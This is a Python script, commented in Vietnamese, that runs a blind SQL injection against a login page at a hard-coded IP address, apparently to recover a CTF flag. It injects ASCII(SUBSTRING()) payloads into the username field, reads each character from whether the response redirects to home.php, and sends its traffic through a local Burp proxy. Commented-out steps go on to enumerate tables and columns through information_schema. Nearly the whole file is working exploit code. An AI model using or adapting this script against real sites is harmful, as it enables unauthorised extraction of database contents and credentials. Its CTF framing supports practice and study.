import requests
import string
import sys
import urllib3

#Tắt cảnh báo bảo mật khi traffic đi qua proxy của Burp Suite
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://103.77.175.40:8021/login-check.php" 

#Cấu hình chuyển hướng traffic sang Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

#Tập hợp các ký tự để brute-force (chữ cái, số, và các ký tự đặc biệt hay có trong flag)
chars = string.ascii_letters + string.digits + "{}_-@!$*"

def exploit(query):
    extracted_string = ""
    print(f"Đang thực thi: {query}")
    
    for i in range(1, 100): #Mặc định quét tối đa chuỗi dài 100 ký tự
        char_found = False
        for c in chars:
            # Dùng ASCII() để đảm bảo phân biệt chữ hoa/chữ thường (rất quan trọng với Flag CTF)
            payload = f"admin' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {ord(c)}-- -"
            data = {
                "uname": payload, 
                "password": "123"
            }
            try:
                # Gửi request qua proxy của Burp, không cho phép redirect tự động
                r = requests.post(
                    TARGET_URL, 
                    data=data, 
                    allow_redirects=False, 
                    proxies=proxies, 
                    verify=False
                )
                
                # Trạng thái TRUE: Nếu Location trỏ về home.php
                if "home.php" in r.headers.get("Location", ""):
                    extracted_string += c
                    # In đè lên dòng hiện tại để nhìn cho mượt
                    sys.stdout.write(f"\r[+] Đã tìm thấy: {extracted_string}")
                    sys.stdout.flush()
                    char_found = True
                    break # Chuyển sang tìm vị trí ký tự tiếp theo
                    
            except requests.exceptions.RequestException as e:
                print(f"\nLỗi kết nối, kiểm tra lại Burp Suite đã mở chưa: {e}")
                sys.exit(1)
                
        # Nếu duyệt qua hết các ký tự mà không thấy -> Đã trích xuất xong chuỗi
        if not char_found:
            break
            
    print(f"\nHoàn tất! Kết quả: {extracted_string}\n")
    return extracted_string

if __name__ == "__main__":
    print("--- BẮT ĐẦU TẤN CÔNG ---")
    
    # Bước 1: Lấy tên Database hiện tại
    db_name = exploit("SELECT database()")
    
    # --- CÁC BƯỚC TIẾP THEO (Mở comment từng dòng để chạy sau khi xong Bước 1) ---
    
    # Bước 2: Lấy tên Bảng (Table) đầu tiên trong database
    # table_name = exploit("SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1")
    
    # Bước 3: Lấy tên Cột (Column) đầu tiên trong bảng vừa tìm được (Giả sử tên bảng là 'users')
    # col_name = exploit("SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1")
    
    # Bước 4: Lấy Flag
    # flag = exploit("SELECT ten_cot FROM ten_bang LIMIT 0,1")